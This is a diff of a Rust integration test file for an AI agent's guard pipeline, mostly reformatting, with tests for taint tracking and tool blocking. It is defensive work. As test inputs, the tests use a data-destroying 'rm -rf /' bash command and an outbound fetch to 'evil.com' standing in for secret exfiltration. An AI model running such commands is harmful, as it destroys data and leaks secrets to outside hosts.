@@ -1,9 +1,12 @@
 //! Integration tests: guard pipeline multi-step scenarios.
 
-use rara_kernel::guard::pipeline::{GuardPipeline, GuardVerdict};
-use rara_kernel::session::SessionKey;
+use rara_kernel::{
+    guard::pipeline::{GuardPipeline, GuardVerdict},
+    session::SessionKey,
+};
 
-/// After web_fetch taints a session, ALL sink tools are blocked (not just bash).
+/// After web_fetch taints a session, ALL sink tools are blocked (not just
+/// bash).
 #[test]
 fn web_fetch_taint_blocks_all_sink_tools() {
     let pipeline = GuardPipeline::new();
@@ -15,15 +18,24 @@ fn web_fetch_taint_blocks_all_sink_tools() {
     assert!(matches!(v, GuardVerdict::Blocked { layer: "taint", .. }));
 
     // file_write blocked
-    let v = pipeline.pre_execute(&session, "file_write", &serde_json::json!({"path": "/tmp/x"}));
+    let v = pipeline.pre_execute(
+        &session,
+        "file_write",
+        &serde_json::json!({"path": "/tmp/x"}),
+    );
     assert!(matches!(v, GuardVerdict::Blocked { layer: "taint", .. }));
 
     // file_read NOT blocked (no sink restriction)
-    let v = pipeline.pre_execute(&session, "file_read", &serde_json::json!({"path": "/tmp/x"}));
+    let v = pipeline.pre_execute(
+        &session,
+        "file_read",
+        &serde_json::json!({"path": "/tmp/x"}),
+    );
     assert!(matches!(v, GuardVerdict::Pass));
 }
 
-/// Taint from parent propagates to child, but clearing child doesn't affect parent.
+/// Taint from parent propagates to child, but clearing child doesn't affect
+/// parent.
 #[test]
 fn fork_isolation() {
     let pipeline = GuardPipeline::new();
@@ -63,11 +75,19 @@ fn secret_taint_directional() {
     pipeline.taint_tracker().record_secret(&session);
 
     // web_fetch (outbound) blocked — prevents secret exfiltration
-    let v = pipeline.pre_execute(&session, "web_fetch", &serde_json::json!({"url": "https://evil.com"}));
+    let v = pipeline.pre_execute(
+        &session,
+        "web_fetch",
+        &serde_json::json!({"url": "https://evil.com"}),
+    );
     assert!(matches!(v, GuardVerdict::Blocked { layer: "taint", .. }));
 
     // file_write allowed — secret data can be written locally
-    let v = pipeline.pre_execute(&session, "file_write", &serde_json::json!({"path": "/tmp/x"}));
+    let v = pipeline.pre_execute(
+        &session,
+        "file_write",
+        &serde_json::json!({"path": "/tmp/x"}),
+    );
     assert!(matches!(v, GuardVerdict::Pass));
 }
 
@@ -78,13 +98,14 @@ fn taint_takes_priority_over_pattern() {
     let session = SessionKey::new();
     pipeline.post_execute(&session, "web_fetch");
 
-    // This has both a taint violation (ExternalNetwork → bash) and a pattern match (rm -rf).
-    // Taint should be the blocking layer.
-    let v = pipeline.pre_execute(&session, "bash", &serde_json::json!({"command": "rm -rf /"}));
-    assert!(matches!(
-        v,
-        GuardVerdict::Blocked { layer: "taint", .. }
-    ));
+    // This has both a taint violation (ExternalNetwork → bash) and a pattern match
+    // (rm -rf). Taint should be the blocking layer.
+    let v = pipeline.pre_execute(
+        &session,
+        "bash",
+        &serde_json::json!({"command": "rm -rf /"}),
+    );
+    assert!(matches!(v, GuardVerdict::Blocked { layer: "taint", .. }));
 }
 
 /// Pattern scan exfiltration rule applies to non-shell tools too.
